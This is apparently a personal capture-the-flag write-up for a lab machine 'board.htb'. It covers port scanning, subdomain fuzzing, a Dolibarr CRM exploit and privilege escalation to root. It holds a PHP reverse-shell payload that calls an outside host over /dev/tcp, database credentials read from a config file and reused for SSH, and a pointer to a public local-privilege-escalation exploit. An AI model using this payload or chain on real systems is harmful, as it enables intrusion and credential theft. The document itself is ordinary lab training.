@@ -1,1 +1,59 @@
 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-03 21:43 EDT
+Nmap scan report for 10.10.11.11
+Host is up (0.043s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
+|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
+|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41
+Service Info: Host: board.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 186.65 seconds
+
+
+Well, it doesn't look like the site actually hosts much content.  Just from some small tests, the contact page doesn't appear to do anything.  However, the pages are written in php - so I'll scan for php files:
+http://10.10.11.11/contact.php
+
+I do see this email at the bottom of the page:
+info@board.htb
+
+So it's likely that will be the box name, I'll add that to the hosts file and look for subdomains as well.  While this is running I'll keep poking around the site.  I did find a comment suggesting there's another page somewhere, but it's inaccessible from what I can tell:
+<!--   <a class="nav-link" href="portfolio.php"> Portfolio </a> -->
+
+ffuf -u http://board.htb -H "Host: FUZZ.board.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac
+This ^ command actually got a result, the gobuster did not - but it's common for me to have issues with gobuster so...  Anyways, adding the crm domain to the hosts file:
+crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 68ms]
+#www                    [Status: 400, Size: 301, Words: 26, Lines: 11, Duration: 78ms]
+#mail                   [Status: 400, Size: 301, Words: 26, Lines: 11, Duration: 90ms]
+
+http://crm.board.htb/
+This had a Dolibarr instance running, I was able to login.  Found this article:
+https://www.swascan.com/security-advisory-dolibarr-17-0-0/
+
+Used the below cmd to get a shell
+<?PHP exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.28/9001 0>&1'"); ?>
+
+Looked up where to find the conf file for this software, and found this location in the docs:
+/var/www/html/crm.board.htb/htdocs/conf
+
+$dolibarr_main_db_user='dolibarrowner';
+$dolibarr_main_db_pass='serverfun2$2023!!'
+
+Using this pass, we can login via ssh as larissa
+------------------------------------------------
+find / -perm -4000 2>/dev/null -> Outputs a list of suid binaries, and one that really sticks out are the below:
+/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
+/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
+/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
+
+Which I just googled this and the first result was the below:
+https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh
+
+Ran this and got root
+
+
